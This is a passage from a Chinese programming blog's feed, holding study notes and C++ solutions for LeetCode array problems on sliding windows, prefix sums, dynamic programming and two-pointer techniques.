class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findAnagrams</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need,window;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:p)</span><br><span class="line">            need[c]++;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; s.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[right];</span><br><span class="line">            right++;<span class="comment">//右移窗口</span></span><br><span class="line">            <span class="keyword">if</span>(need.<span class="built_in">count</span>(c))&#123;</span><br><span class="line">                window[c]++;</span><br><span class="line">                <span class="keyword">if</span>(window[c] == need[c])</span><br><span class="line">                    valid++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//什么时候左移？当窗口</span></span><br><span class="line">            <span class="comment">//if(valid == p.size())&#123; 书写错误p.size()和need.size()不一定相同的，因为p中可以有重复字符</span></span><br><span class="line">            <span class="keyword">while</span>(valid == need.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(right-left==p.<span class="built_in">size</span>())</span><br><span class="line">                    res.<span class="built_in">push_back</span>(left);<span class="comment">//返回起始索引</span></span><br><span class="line">                <span class="keyword">char</span> d = s[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="560-和为-K-的子数组——连续子数组"><a href="#560-和为-K-的子数组——连续子数组" class="headerlink" title="560 和为 K 的子数组——连续子数组"></a>560 和为 K 的子数组——连续子数组</h3><p>给你一个整数数组 nums 和一个整数 k ，请你统计并返回 该数组中和为 k 的【连续子数组】的个数。<br><strong>动规？！</strong><br>pre[i] 为 [0..i] 里所有数的和，则 pre[i] 可以由 pre[i−1] 递推而来，即：<br>    pre[i]=pre[i−1]+nums[i]<br>那么「[j..i] 这个子数组和为 k 」这个条件我们可以转化为<br>    pre[i]−pre[j−1]==k </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>, pre = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x:nums)&#123;</span><br><span class="line">            pre += x;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">find</span>(pre-k) != maap.<span class="built_in">end</span>())</span><br><span class="line">                count += maap[pre-k];</span><br><span class="line">            maap[pre]++;<span class="comment">//装入 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  s[i]表示 前i+1个数的和，包括自己</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">s</span><span class="params">(n)</span></span>;</span><br><span class="line">        s[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            s[i] = s[i<span class="number">-1</span>] + nums[i];<span class="comment">//递推公式</span></span><br><span class="line">            <span class="comment">//maap[s[i]]++;//前和是s[i]的个数——错误！！！！！！！！不应该提前存放</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count =<span class="number">0</span>;</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//这是考虑到 当s[i]==k的情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">count</span>(s[i]-k))<span class="comment">//maap.count(s[i]-k)考虑到</span></span><br><span class="line">                count += maap[s[i]-k];</span><br><span class="line">            maap[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53 最大子数组和"></a>53 最大子数组和</h3><p><strong>分析：</strong><br><strong>第560题：和为 K 的子数组——思路是 求出前i连续序列的和</strong></p><p><strong>放在本题上，可以理解为：以第i个数结尾的连续子序列的和</strong></p><p><strong>大问题-&gt;小问题：动态规划</strong></p><ul><li><p>dp[i]：表示以 nums[i] <code>结尾</code> 的 【连续子数组的 <code>最大和</code>】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i] = <span class="built_in">max</span>(nums[i],dp[i<span class="number">-1</span>]+nums[i]);</span><br><span class="line">            res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            cout&lt;&lt;dp[i]&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        cout &lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">或者</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]&gt;=<span class="number">0</span>)</span><br><span class="line">            s[i] = s[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s[i] = nums[i];</span><br></pre></td></tr></table></figure><h3 id="904-水果成篮"><a href="#904-水果成篮" class="headerlink" title="904 水果成篮"></a>904 水果成篮</h3><p>农场从左到右种植了一排果树。这些树用一个整数数组 fruits 表示，其中 fruits[i] 是第 i 棵树上的水果 种类 。</p><p>  你只有【两个篮子】，并且每个篮子只能装 单一类型 的水果。每个篮子能够装的水果总量没有限制。<br>  你可以选择任意一棵树开始采摘，你必须从 每棵 树（包括开始采摘的树）上 恰好摘一个水果。采摘的水果应当符合篮子中的水果类型。每采摘一次，你将会向右移动到下一棵树，并继续采摘。<br>  一旦你走到某棵树前，但水果不符合篮子的水果类型，那么就必须停止采摘。</p></li></ul><p>给你一个整数数组 fruits ，返回你可以<strong>收集的水果的 最大 数目</strong>。</p><p><strong>分析：</strong><br>【滑动窗口】：left 和 right 分别表示满足要求的窗口的左右边界，同时使用哈希表存储这个窗口内的数以及出现的次数。</p><p>我们每次将 right 移动一个位置，并将 fruits[right] 加入哈希表。如果此时哈希表不满足要求（即哈希表中出现超过两个键值对），那么我们需要不断移动 left，并将 fruits[left] 从哈希表中移除，直到哈希表满足要求为止。</p><p>注意的是，将 fruits[left] 从哈希表中移除后，如果 fruits[left] 在哈希表中的出现次数减少为 0，需要将对应的键值对从哈希表中移除。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">totalFruit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; fruits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = fruits.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> right=<span class="number">0</span>; right&lt;n; right++)&#123;</span><br><span class="line">            maap[fruits[right]]++;<span class="comment">//装入</span></span><br><span class="line">            <span class="keyword">while</span>(maap.<span class="built_in">size</span>()&gt;<span class="number">2</span>)&#123;<span class="comment">//因为结果只能包含两种树</span></span><br><span class="line">                <span class="keyword">auto</span> it = maap.<span class="built_in">find</span>(fruits[left]);</span><br><span class="line">                --it-&gt;second;</span><br><span class="line">                <span class="keyword">if</span>(it-&gt;second==<span class="number">0</span>)</span><br><span class="line">                    maap.<span class="built_in">erase</span>(it);</span><br><span class="line">                left++;<span class="comment">//滑动左边界</span></span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res,right-left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>七、数组</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%B8%83%E3%80%81%E6%95%B0%E7%BB%84/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%B8%83%E3%80%81%E6%95%B0%E7%BB%84/</id>
    <published>2025-12-03T06:14:15.000Z</published>
    <updated>2025-12-03T06:17:58.754Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="七、数组"><a href="#七、数组" class="headerlink" title="七、数组"></a>七、数组</h2><h3 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27 移除元素"></a>27 移除元素</h3><p>给你一个数组 nums 和一个值 val，你需要 <strong>原地 移除</strong>所有数值等于 val 的元素，并返回移除后数组的新长度。<br>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。<br>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。<br><strong>误区：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (array[i] == target) &#123;</span><br><span class="line">        array.<span class="built_in">erase</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这个代码看上去好像是<span class="built_in">O</span>(n)的时间复杂度，其实是<span class="built_in">O</span>(n^<span class="number">2</span>)的时间复杂度，因为erase操作也是<span class="built_in">O</span>(n)的操作。</span><br><span class="line"></span><br><span class="line">所以此时使用双指针法才展现出效率的优势：通过两个指针在一个<span class="keyword">for</span>循环下完成两个<span class="keyword">for</span>循环的工作</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)<span class="comment">//满足条件才拷贝</span></span><br><span class="line">                nums[j++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针：其中一个指针用于遍历i，另一个相当于是“一个新的数组下标”j，其实还是原本的数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//至多遍历序列 两次</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != val)</span><br><span class="line">                nums[j++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>【<strong>双指针优化</strong>】：<br>    如果要移除的元素恰好在数组的开头。<br>    例如序列 [1,2,3,4,5]，当 val 为 1 时，我们需要把每一个元素都左移一位。注意到题目中说：「元素的顺序可以改变」。实际上我们可以直接将最后一个元素 5 移动到序列开头，取代元素 1，得到序列 [5,2,3,4]，同样满足题目要求。这个优化在序列中 val 元素的数量较少时非常有效。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针优化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//至多遍历序列 一次</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[left]==val)&#123;</span><br><span class="line">                nums[left] = nums[right<span class="number">-1</span>];</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力  O(n^2)  O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> size = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == val) &#123; <span class="comment">// 发现需要移除的元素，就将数组集体向前移动一位</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    nums[j - <span class="number">1</span>] = nums[j];</span><br><span class="line">                &#125;</span><br><span class="line">                i--; <span class="comment">// 因为下标i以后的数值都向前移动了一位，所以i也向前移动一位</span></span><br><span class="line">                size--; <span class="comment">// 此时数组的大小-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="26-删除有序数组中的重复项——留一个，返长度"><a href="#26-删除有序数组中的重复项——留一个，返长度" class="headerlink" title="26 删除有序数组中的重复项——留一个，返长度"></a>26 删除有序数组中的重复项——留一个，返长度</h3><p>给你一个 <strong>升序排列</strong> 的数组 nums ，请你 <strong>原地 删除</strong> 重复出现的元素，使每个元素 只出现一次 。<br>【返回删除后数组的新长度】。<br>元素的 相对顺序 应该保持 一致 。</p><p><strong>分析：</strong><br>定义两个指针 fast 和 slow 分别为快指针和慢指针，快指针表示遍历数组到达的下标位置，慢指针表示下一个不同元素要填入的下标位置，初始时两个指针都指向下标 1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast=<span class="number">1</span>,slow=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast]!=nums[fast<span class="number">-1</span>])&#123;</span><br><span class="line">                nums[slow]=nums[fast];<span class="comment">//更新数组</span></span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="283-移动零——移到末尾"><a href="#283-移动零——移到末尾" class="headerlink" title="283 移动零——移到末尾"></a>283 移动零——移到末尾</h3><p>给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。【<strong>原地操作</strong>】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;<span class="comment">//i遍历 j更新数组</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]!=<span class="number">0</span>)&#123;</span><br><span class="line">                nums[j++]=nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//后面补0即可</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> p=j;p&lt;n;p++)&#123;</span><br><span class="line">            nums[p]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//left指向0  right指向非0  然后交换，总是把0换到右边</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//left左边均是 非零数</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>(), left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[left], nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="905-按奇偶排序数组——偶前奇后"><a href="#905-按奇偶排序数组——偶前奇后" class="headerlink" title="905 按奇偶排序数组——偶前奇后"></a>905 按奇偶排序数组——偶前奇后</h3><p>给你一个整数数组 nums，将 nums 中的的所有偶数元素移动到数组的前面，后跟所有奇数元素。<br>返回满足此条件的 任一数组 作为答案.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 